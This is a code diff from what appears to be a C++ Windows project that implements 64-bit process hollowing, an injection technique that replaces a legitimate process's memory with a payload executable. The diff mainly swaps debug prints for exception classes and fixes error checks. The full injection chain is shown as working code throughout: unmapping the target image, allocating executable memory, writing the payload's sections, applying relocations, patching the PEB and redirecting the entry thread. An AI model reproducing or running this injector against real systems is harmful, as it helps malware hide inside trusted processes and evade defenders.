@@ -6,20 +6,23 @@
 #include <DbgHelp.h>
 #include <stdint.h>
 #include <iostream>
+#include "exceptions/IncompatibleImagesException.hpp"
+#include "exceptions/ImageWindowsBitnessException.hpp"
+#include "exceptions/HollowingException.hpp"
+
+const std::string RELOCATION_SECTION_NAME = ".reloc";
 
 Hollowing64Bit::Hollowing64Bit(const std::string& targetPath, const std::string& payloadPath) :
     HollowingFunctions(targetPath, payloadPath)
 {
-    if (!AreProcessesCompatible())
-    {   
-        std::cout << "The processes are incompatible!" << std::endl;
-        throw ""; // Replace with an exception class
-    }
-
     if (!IsWindows64Bit())
     {
-        std::cout << "Cannot work with 64 bit images on a 32 bit Windows build!" << std::endl;
-        throw ""; // Replace with an exception class
+        throw ImageWindowsBitnessException("Cannot work with 64 bit images on a 32 bit Windows build!");
+    }
+
+    if (!AreProcessesCompatible())
+    {
+        throw IncompatibleImagesException("The processes are incompatible!");
     }
 }
 
@@ -34,14 +37,13 @@ void Hollowing64Bit::hollow()
 
     if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(targetPEB.ImageBaseAddress)))
     {
-        std::cout << "206" << std::endl;
-        // Exception
+        throw HollowingException("An error occured while unmapping the target's memory!");
     }
-    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress,
+    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(targetPEB.ImageBaseAddress),
         payloadNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if(nullptr == targetNewBaseAddress)
     {
-        std::cout << "202 Error Code: " << GetLastError() << std::endl;
+        throw HollowingException("An error occured while allocating new memory for the target!");
     }
 
     std::cout << "New base address: " << std::hex << targetNewBaseAddress << std::endl;
@@ -62,6 +64,8 @@ void Hollowing64Bit::hollow()
     std::cout << "Resuming the target's main thread" << std::endl;
     
     NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);
+
+    _hollowed = true;
 }
 
 void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
@@ -73,16 +77,16 @@ void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
     DWORD oldProtection = 0;
     SIZE_T writtenBytes = 0;
     if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
-        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || 0 != writtenBytes)
+        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || 0 == writtenBytes)
     {
-        std::cout << "213" << std::endl;
+        throw HollowingException("An error occured while writing the payload's headers to the target!");
     }
     // Updating the ImageBase field
     if(0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<LPBYTE>(targetBaseAddress) + sourceDOSHeader->e_lfanew +
         offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER64, ImageBase), &targetBaseAddress,
         sizeof(ULONGLONG), &writtenBytes) || 0 == writtenBytes)
     {
-        std::cout << "82" << std::endl;
+        throw HollowingException("An error occured while updating the ImageBase field!");
     }
     VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
         PAGE_READONLY, &oldProtection);
@@ -93,12 +97,18 @@ void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
             sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));
         
         printf("Writing %s\n", currentSection->Name);
-        NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(targetBaseAddress) +
+        if (ERROR_SUCCESS != NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(targetBaseAddress) +
             currentSection->VirtualAddress), (sourceFileContents + currentSection->PointerToRawData),
-            currentSection->SizeOfRawData, nullptr);
+            currentSection->SizeOfRawData, nullptr))
+        {
+            throw HollowingException("An error occured while writing a payload's section to the target!");
+        }
 
-        VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
-            SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
+        if (0 == VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
+            SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection))
+        {
+            throw HollowingException("An error occured while changing a section's page permissions!");
+        }
     }
 }
 
@@ -109,13 +119,15 @@ void Hollowing64Bit::UpdateTargetProcessEntryPoint(PVOID newEntryPointAddress)
 
     if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
     {
-        std::cout << "169" << std::endl;
-        // Exception
+        throw HollowingException("An error occured while getting the target's thread context!");
     }
 
     threadContext.Rcx = reinterpret_cast<intptr_t>(newEntryPointAddress);
 
-    SetThreadContext(_targetProcessInformation.hThread, &threadContext);
+    if (0 == SetThreadContext(_targetProcessInformation.hThread, &threadContext))
+    {
+        throw HollowingException("An error occured while setting the target's thread context!");
+    }
 }
 
 PIMAGE_DATA_DIRECTORY Hollowing64Bit::GetPayloadDirectoryEntry(DWORD directoryID)
@@ -158,16 +170,20 @@ PIMAGE_SECTION_HEADER Hollowing64Bit::FindTargetProcessSection(const std::string
     }
 
     return nullptr;
-    // Exception
 }
 
 void Hollowing64Bit::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress)
 {
     PIMAGE_DATA_DIRECTORY relocData = GetPayloadDirectoryEntry(IMAGE_DIRECTORY_ENTRY_BASERELOC);
     DWORD dwOffset = 0;
-    PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(".reloc");
+    PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(RELOCATION_SECTION_NAME);
+
+    if (nullptr == relocSectionHeader)
+    {
+        throw HollowingException("The payload must have a relocation section!");
+    }
+
     DWORD dwRelocAddr = relocSectionHeader->PointerToRawData;
-    printf("249 Header name: %s\n", relocSectionHeader->Name);
 
     while (dwOffset < relocData->Size)
     {
@@ -194,16 +210,21 @@ void Hollowing64Bit::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRel
         if (IMAGE_REL_BASED_ABSOLUTE != blockEntries[i].Type)
         {
             DWORD dwFieldAddress = baseRelocationBlock->PageAddress + blockEntries[i].Offset;
-            ULONGLONG dwBuffer = 0;
-            ReadProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
-                &dwBuffer, sizeof(dwBuffer), nullptr);
-            
-            dwBuffer += baseAddressesDelta;
-
-            if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
-                &dwBuffer, sizeof(dwBuffer), nullptr))
+            ULONGLONG addressToFix = 0;
+            SIZE_T readBytes = 0;
+            if (0 == ReadProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
+                &addressToFix, sizeof(addressToFix), &readBytes)  || sizeof(addressToFix) != readBytes)
             {
-                std::cout << "265 Error Code: " << GetLastError() << std::endl;
+                throw HollowingException("An error occured while reading the address to relocate from the target!");
+            }
+            
+            addressToFix += baseAddressesDelta;
+
+            SIZE_T writtenBytes = 0;
+            if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
+                &addressToFix, sizeof(addressToFix), &writtenBytes) || sizeof(addressToFix) != writtenBytes)
+            {
+                throw HollowingException("An error occured while writing the relocated address to the target!");
             }
         }
     }
@@ -216,15 +237,14 @@ void Hollowing64Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
 
     if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
     {
-        std::cout << "184" << std::endl;
-        // Exception
+        throw HollowingException("An error occured while getting the target's thread context!");
     }
 
     SIZE_T writtenBytes = 0;
     if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(threadContext.Rdx + offsetof(PEB64, ImageBaseAddress)),
         &processNewBaseAddress, sizeof(ULONGLONG), &writtenBytes) || sizeof(ULONGLONG) != writtenBytes)
     {
-        std::cout << "303" << std::endl;
+        throw HollowingException("An error occured while writing the new base address in the target's PEB!");
     }
 }
 
